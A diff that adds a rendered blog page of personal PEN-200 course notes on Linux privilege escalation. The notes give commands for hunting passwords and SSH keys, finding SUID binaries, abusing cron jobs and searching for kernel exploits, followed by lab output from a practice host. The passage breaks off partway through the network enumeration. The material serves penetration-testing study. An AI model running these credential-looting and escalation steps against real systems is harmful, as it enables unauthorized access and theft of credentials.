@@ -1,0 +1,1810 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">linux-priv-esc.html</h4>
+        <div class="git-file-meta">
+          <span>92 KB</span>
+          <span>site-output/blog/linux-priv-esc.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;title&gt;Core – PEN-200 Module 17 — Linux Privilege Escalation Guide&lt;/title&gt;
+
+  
+    &lt;!-- head partial (auto-generated) --&gt;
+
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0, viewport-fit=cover&quot;/&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Audiowide&amp;family=Orbitron:wght@400..900&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Rubik+Iso&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../assets/static/style/cm.css&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Syne+Mono&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;../assets/static/js/cm.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://unpkg.com/htmx.org@1.9.12&quot; defer&gt;&lt;/script&gt;
+&lt;link rel=&quot;manifest&quot; href=&quot;../site.webmanifest&quot;/&gt;
+&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;../assets/static/img/favicon.ico&quot;&gt;
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+&lt;/head&gt;
+&lt;body class=&quot;cm-body blog-page&quot;&gt;
+  &lt;header&gt;
+    &lt;div class=&quot;container header-container&quot;&gt;
+      
+      
+      
+        &lt;a href=&quot;../index.html&quot; class=&quot;logo-link&quot;&gt;
+          &lt;img src=&quot;../assets/static/img/not-dead.webp&quot; alt=&quot;Core Logo&quot; class=&quot;logo&quot;&gt;
+        &lt;/a&gt;
+      
+      
+      
+        &lt;button type=&quot;button&quot; class=&quot;nav-toggle&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+          &lt;svg width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot;&gt;
+            &lt;path d=&quot;M3 7h18M3 12h18M3 17h18&quot; /&gt;
+          &lt;/svg&gt;
+        &lt;/button&gt;
+        &lt;nav class=&quot;main-nav&quot;&gt;
+          &lt;ul class=&quot;nav-links&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../index.html&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../blog.html&quot;&gt;Blog&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        &lt;/nav&gt;
+      
+    &lt;/div&gt;
+  &lt;/header&gt;
+
+  &lt;main class=&quot;blog-container blog-post-view&quot;&gt;
+    &lt;div class=&quot;blog-article-shell&quot;&gt;
+      &lt;a class=&quot;blog-back-link&quot; href=&quot;../blog.html&quot;&gt;
+        &lt;svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; aria-hidden=&quot;true&quot;&gt;
+          &lt;path d=&quot;M15 18l-6-6 6-6&quot; /&gt;
+        &lt;/svg&gt;
+        Back to Chaos &amp;amp; Majesty Journal
+      &lt;/a&gt;
+      
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;linux-priv-esc&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;PEN-200 Module 17 — Linux Privilege Escalation Guide&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Oct 29, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;72 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;These notes expand the earlier outline with the detailed commands captured in the labs. Treat it as your Linux privesc checklist.&lt;/p&gt;
+&lt;h3&gt;Baseline Recon&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;uname -a
+cat /etc/*release
+id
+sudo -l
+lsblk
+ps aux --forest
+ss -tulpn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Note kernel version, architecture, LSB data, and virtualisation hints.&lt;/li&gt;
+&lt;li&gt;Record running services and which users own them.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Credential &amp;amp; Config Looting&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Search for passwords and API keys:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;find / -type f -name &amp;quot;*.conf&amp;quot; -o -name &amp;quot;*.ini&amp;quot; -o -name &amp;quot;*.php&amp;quot; 2&amp;gt;/dev/null | xargs grep -i &amp;quot;password&amp;quot;
+strings /var/www/html/config.php | grep -i pass
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Inspect &lt;code&gt;/var/backups&lt;/code&gt;, &lt;code&gt;/opt&lt;/code&gt;, cron scripts, and git repos for secrets.&lt;/li&gt;
+&lt;li&gt;Check SSH keys (&lt;code&gt;find /home -name &amp;quot;id_rsa&amp;quot; -o -name &amp;quot;authorized_keys&amp;quot;&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;SUID / Capability Abuse&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;find / -perm -4000 -type f 2&amp;gt;/dev/null
+getcap -r / 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Compare SUID binaries against &lt;code&gt;GTFOBins&lt;/code&gt;; test exploitation paths.&lt;/li&gt;
+&lt;li&gt;For writable scripts executed by root (&lt;code&gt;/usr/local/bin/backup.sh&lt;/code&gt;), append your payload.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Cron &amp;amp; Timer Abuse&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;cat /etc/crontab
+ls -al /etc/cron.d
+systemctl list-timers --all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;If cron executes user-writable scripts, inject commands.&lt;/li&gt;
+&lt;li&gt;For systemd timers, edit unit files or replace referenced scripts when permissions allow.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Kernel &amp;amp; Library Exploits&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Check exploit-db for kernel version vulnerabilities (&lt;code&gt;searchsploit &amp;quot;linux kernel&amp;quot; 5.4&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;Validate prerequisites (SMEP/SMAP, GCC presence) before launching older exploits like DirtyCow.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Automation Aids&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Run &lt;code&gt;linpeas.sh&lt;/code&gt; or &lt;code&gt;lse.sh&lt;/code&gt; after manual recon; annotate findings with risk &amp;amp; feasibility.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;pspy&lt;/code&gt; to monitor processes that may reveal credential drops or scheduled jobs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Documentation &amp;amp; Cleanup&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Keep a privesc log: command executed, outcome, files modified.&lt;/li&gt;
+&lt;li&gt;After elevating, grab proof (&lt;code&gt;id&lt;/code&gt;, &lt;code&gt;hostname&lt;/code&gt;, &lt;code&gt;cat /etc/shadow&lt;/code&gt; snippet redacted) then reverse changes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Defensive Advice&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Recommend patching kernels, pruning SUID binaries, and enforcing file ACL hygiene.&lt;/li&gt;
+&lt;li&gt;Suggest centralising logs and enabling auditd rules for privilege events (&lt;code&gt;execve&lt;/code&gt;, &lt;code&gt;setuid&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Linux privilege escalation rewards curiosity and rigor. With these workflows you’ll move from user to root methodically and leave a clear trail defenders can follow.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h3&gt;Linux Privilege Escalation&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Enumerating Linux.&lt;/li&gt;
+&lt;li&gt;Exposed Confidential Information.&lt;/li&gt;
+&lt;li&gt;Insecure File Permissions.&lt;/li&gt;
+&lt;li&gt;Abusing System Linux components.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Enumerating Linux 17.1&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand files and users privileges on Linux.&lt;/li&gt;
+&lt;li&gt;Perform manual enumeration.&lt;/li&gt;
+&lt;li&gt;Conduct automated enumeration.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Understanding Files and Users Privileges on Linux&lt;/h5&gt;
+&lt;p&gt;A defining feature of Linux/Unix is that most resources are represented in the FS:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Files.&lt;/li&gt;
+&lt;li&gt;Directories.&lt;/li&gt;
+&lt;li&gt;Devices.&lt;/li&gt;
+&lt;li&gt;Network communication interfaces.&lt;/li&gt;
+&lt;li&gt;In essence &amp;quot;everything is a file&amp;quot;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Every file or element of a Linux system adheres to &lt;a href=&quot;https://wiki.archlinux.org/index.php/users_and_groups&quot;&gt;user and group&lt;/a&gt; permissions with 3 primary properties:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Read (r)&lt;/li&gt;
+&lt;li&gt;Write (w)&lt;/li&gt;
+&lt;li&gt;Execute (x)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Each file/directory has permissions in 3 categories of users:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Owner.&lt;/li&gt;
+&lt;li&gt;Owner group.&lt;/li&gt;
+&lt;li&gt;Others group.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Each perm (rwx) allows authorized users to perform different actions dependent on if the resource is a file or directory.&lt;/p&gt;
+&lt;p&gt;For files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(r) allows reading file content.&lt;/li&gt;
+&lt;li&gt;(w) allows changing the content.&lt;/li&gt;
+&lt;li&gt;(x) allows file execution.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Directories are handles differently:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(r) right to list the contents.&lt;/li&gt;
+&lt;li&gt;(w) create or delete files.&lt;/li&gt;
+&lt;li&gt;(x) allows crossing through dir to access contents using CLI.&lt;/li&gt;
+&lt;li&gt;The ability to cross through a dir without read allows the user to access unknown entries, only by knowing their exact names.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A simple example of these permissions on our local system:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/lin-priv-esc]
+└─$ ls -l /etc/shadow               
+-rw-r----- 1 root shadow 1510 Aug 26 18:13 /etc/shadow
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;For each user category 3 different access perms are displayed.&lt;/li&gt;
+&lt;li&gt;The first &lt;code&gt;-&lt;/code&gt; indicates file type and can be safely ignored.&lt;/li&gt;
+&lt;li&gt;The next 3 are &lt;code&gt;root&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;rw-&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Owner has read, write, no exec.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The next &lt;code&gt;shadow&lt;/code&gt; group owner.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;r--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Owner only has read access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;others&lt;/code&gt; group.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;---&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Has no rights on the file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Manual Enumeration&lt;/h5&gt;
+&lt;p&gt;Although time consuming, manual enumeration allows for a more controlled outcome and identifies lesser known PrivEsc vectors which are often overlooked by automated tools.  Automated enumeration cannot replace manual, the customized settings of our env are most likely to be misconfigured.&lt;/p&gt;
+&lt;p&gt;Upon initial access, the first thing we should ID is user context:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We can use the &lt;code&gt;id&lt;/code&gt; command.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://man7.org/linux/man-pages/man1/id.1.html&quot;&gt;id&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ id
+uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The output shows we are user &lt;code&gt;joe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Has (UID) and (GID) of &lt;code&gt;1000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We also have group membership outside of our scope.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To enumerate all users, we can read the contents of &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+eve:x:1001:1001:,,,:/home/eve:/bin/bash
+lightdm:x:118:125:Light Display Manager:/var/lib/lightdm:/bin/false
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;passwd&lt;/code&gt; lists several user accounts.&lt;/li&gt;
+&lt;li&gt;Including service accounts.&lt;/li&gt;
+&lt;li&gt;Such as &lt;code&gt;www-data&lt;/code&gt; and &lt;code&gt;sshd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Indicating presence of web and ssh server.&lt;/li&gt;
+&lt;li&gt;Our current user data.&lt;/li&gt;
+&lt;li&gt;Login name &lt;code&gt;joe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Encrypted password &lt;code&gt;x&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Typically contains hashed version of user password.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;x&lt;/code&gt; indicated the hash is contained in the &lt;code&gt;/etc/shadows&lt;/code&gt; file.&lt;ul&gt;
+&lt;li&gt;UID &lt;code&gt;1000&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Root user always has a UID of &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Regular users start from &lt;code&gt;1000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Also referred to as the &amp;quot;real user ID&amp;quot;.
+- GID &lt;code&gt;1000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The user&amp;#39;s specific Group ID.&lt;ul&gt;
+&lt;li&gt;Comment &lt;code&gt;joe,,,&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Description of user.&lt;/li&gt;
+&lt;li&gt;Often repeats username info.&lt;ul&gt;
+&lt;li&gt;Home folder &lt;code&gt;/home/joe&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Describes user home directory prompted at login.&lt;ul&gt;
+&lt;li&gt;Login shell &lt;code&gt;/bin/bash&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Indicates default interactive shell, if exists.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Other than our user &lt;code&gt;joe&lt;/code&gt;, we find a user &lt;code&gt;eve&lt;/code&gt; and can infer they are a standard user since the configured home folder is &lt;code&gt;/home/eve&lt;/code&gt;.  System service homes are configured with &lt;code&gt;/usr/sbin/nologin&lt;/code&gt; as shell, where &lt;code&gt;nologin&lt;/code&gt; statement is used to block remote/local login of service account.&lt;/p&gt;
+&lt;p&gt;Enumerating all users of the target system helps ID potentially high-priv user accounts we may want to target in PrivEsc attempts.&lt;/p&gt;
+&lt;p&gt;The next item we want to note is the machine&amp;#39;s &lt;code&gt;hostname&lt;/code&gt;, which often provide clues about the functional role of the machine.  Abbreviations such as web, db, or dc can indicated to us the system&amp;#39;s purpose.&lt;/p&gt;
+&lt;p&gt;On most Linux distros, the hostname will be shown in the command prompt, but we should always rely on system commands since the prompt text can be manipulated.&lt;/p&gt;
+&lt;p&gt;We can use the &lt;code&gt;hostname&lt;/code&gt; command to retrieve this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ hostname
+debian-privesc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Enterpises often have enforced hostname naming convention schemes for categorizing by location, description, OS, and service level.&lt;/li&gt;
+&lt;li&gt;In our case, the hostname is two parts.&lt;/li&gt;
+&lt;li&gt;OS type.&lt;/li&gt;
+&lt;li&gt;Description.&lt;/li&gt;
+&lt;li&gt;The role of a machine can help us focus our info gathering by adding context around the host.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;During the PrivEsc process we may need kernel exploits to leverage core OS vulns.  This class of exploit is built for very specific types of targets, specified by OS and version combo.  Attacking a target with a mismatched kernel exploit can lead to system error or crash, we must gather precise info about the target before selecting an exploit.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;During the PrivEsc process we may need kernel exploits to leverage core OS vulns.  This class of exploit is built for very specific types of targets, specified by OS and version combo.  Attacking a target with a mismatched kernel exploit can lead to system error or crash, we must gather precise info about the target before selecting an exploit.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;To obtain system info we can review:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/issue&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/*-release&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;uname -a&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ cat /etc/issue &amp;amp;&amp;amp; cat /etc/*-release &amp;amp;&amp;amp; uname -a
+Debian GNU/Linux 10 \n \l
+
+PRETTY_NAME=&amp;quot;Debian GNU/Linux 10 (buster)&amp;quot;
+NAME=&amp;quot;Debian GNU/Linux&amp;quot;
+VERSION_ID=&amp;quot;10&amp;quot;
+VERSION=&amp;quot;10 (buster)&amp;quot;
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL=&amp;quot;https://www.debian.org/&amp;quot;
+SUPPORT_URL=&amp;quot;https://www.debian.org/support&amp;quot;
+BUG_REPORT_URL=&amp;quot;https://bugs.debian.org/&amp;quot;
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;issue&lt;/code&gt; and &lt;code&gt;os-release&lt;/code&gt; foles in &lt;code&gt;/etc&lt;/code&gt; contain.&lt;/li&gt;
+&lt;li&gt;OS version.&lt;/li&gt;
+&lt;li&gt;Release-specific info.&lt;/li&gt;
+&lt;li&gt;Including distro code name.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;uname -a&lt;/code&gt; outputs.&lt;/li&gt;
+&lt;li&gt;Kernel version.&lt;/li&gt;
+&lt;li&gt;Architecture.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Next we explore running processes and services that may allow PrivEsc.  For this:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The proc must run in the context of a priv account.&lt;/li&gt;
+&lt;li&gt;Must have either.&lt;/li&gt;
+&lt;li&gt;Insecure perms.&lt;/li&gt;
+&lt;li&gt;Allow us to interact with it in unintended ways.&lt;/li&gt;
+&lt;li&gt;We can list sys procs, included those run by priv user, with &lt;code&gt;ps&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Use flags.
+ - &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;x&lt;/code&gt; to list procs with and without a &lt;a href=&quot;https://www.linusakesson.net/programming/tty/&quot;&gt;TTY&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;u&lt;/code&gt; user-readable format.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.5 169596 10332 ?        Ss   14:16   0:03 /sbin/init
+...
+colord     811  0.0  0.6 246964 12312 ?        Ssl  14:16   0:00 /usr/lib/colord/colord
+www-data   988  0.0  0.1  11480  3756 ?        S    14:19   0:00 /usr/sbin/apache2 -k sta
+www-data   989  0.0  0.3 1216084 6428 ?        Sl   14:19   0:00 /usr/sbin/apache2 -k sta
+www-data   990  0.0  0.4 1216084 8468 ?        Sl   14:19   0:00 /usr/sbin/apache2 -k sta
+root      1052  0.0  0.3  27160  8124 ?        Ss   14:19   0:00 /usr/sbin/cupsd -l
+root      1053  0.0  0.5 176748 10860 ?        Ssl  14:19   0:00 /usr/sbin/cups-browsed
+systemd+  1186  0.0  0.3  20956  6652 ?        Ss   14:19   0:00 /lib/systemd/systemd-net
+root      1697  0.0  0.3  14648  7996 ?        Ss   14:23   0:00 sshd: joe [priv]
+joe       1702  0.0  0.4  21168  9276 ?        Ss   14:23   0:00 /lib/systemd/systemd --u
+joe       1703  0.0  0.1 170896  2564 ?        S    14:23   0:00 (sd-pam)
+joe       1717  0.0  0.2  14932  6092 ?        S    14:23   0:00 sshd: joe@pts/0
+joe       1718  0.0  0.2   8236  5056 pts/0    Ss   14:23   0:00 -bash
+root      4191  0.0  0.0      0     0 ?        I    14:43   0:00 [kworker/0:0-events_powe
+root      4916  0.0  0.0      0     0 ?        I    14:49   0:00 [kworker/0:3-ata_sff]
+root      6168  0.0  0.0      0     0 ?        I    15:00   0:00 [kworker/u4:1-events_unb
+root      6170  0.0  0.0      0     0 ?        I    15:00   0:00 [kworker/1:3-cgroup_dest
+root      6857  0.0  0.0      0     0 ?        I    15:06   0:00 [kworker/1:0-cgroup_dest
+root      8068  0.0  0.0      0     0 ?        I    15:16   0:00 [kworker/1:1-events]
+root      8136  0.0  0.0      0     0 ?        I    15:17   0:00 [kworker/u4:2-events_unb
+root      8322  0.0  0.0      0     0 ?        I    15:18   0:00 [kworker/0:2-cgroup_dest
+root      8729  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/u4:0-events_unb
+root      8731  0.0  0.0      0     0 ?        I    15:22   0:00 [kworker/1:2-cgroup_dest
+eve       8926  0.1  0.4  21168  9040 ?        Ss   15:24   0:00 /lib/systemd/systemd --u
+eve       8927  0.0  0.1 170896  2604 ?        S    15:24   0:00 (sd-pam)
+joe       8949  0.0  0.1  10628  3136 pts/0    R+   15:24   0:00 ps aux
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The output shows several &lt;code&gt;root&lt;/code&gt; owned services we should research.&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;ps&lt;/code&gt; command we ran is also listed in the output owned by our current user.&lt;/li&gt;
+&lt;li&gt;We can filter specific user-owned procs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Next we will review the network interfaces, routes, and open ports of the target sys.  This allows us to determine if the target is connected to multiple networks and could potentially be used to pivot.  Presence of virtual ifaces may indicated the existence of virtualization or AV software.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly reachable from the original attack machine.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Port bindings can tell us if a running service is only available on a loopback address instead of a routable iface.  A privileged service running on a LO iface could expand our attack surface and increase probability of PrivEsc success.&lt;/p&gt;
+&lt;p&gt;Depending on the Linux version we can list TCP/IP config of network adapters with &lt;code&gt;ipconfig&lt;/code&gt; or &lt;code&gt;ip&lt;/code&gt;, both accept the &lt;code&gt;a&lt;/code&gt; flag to display all available info.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;joe@debian-privesc:~$ ip a
+1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
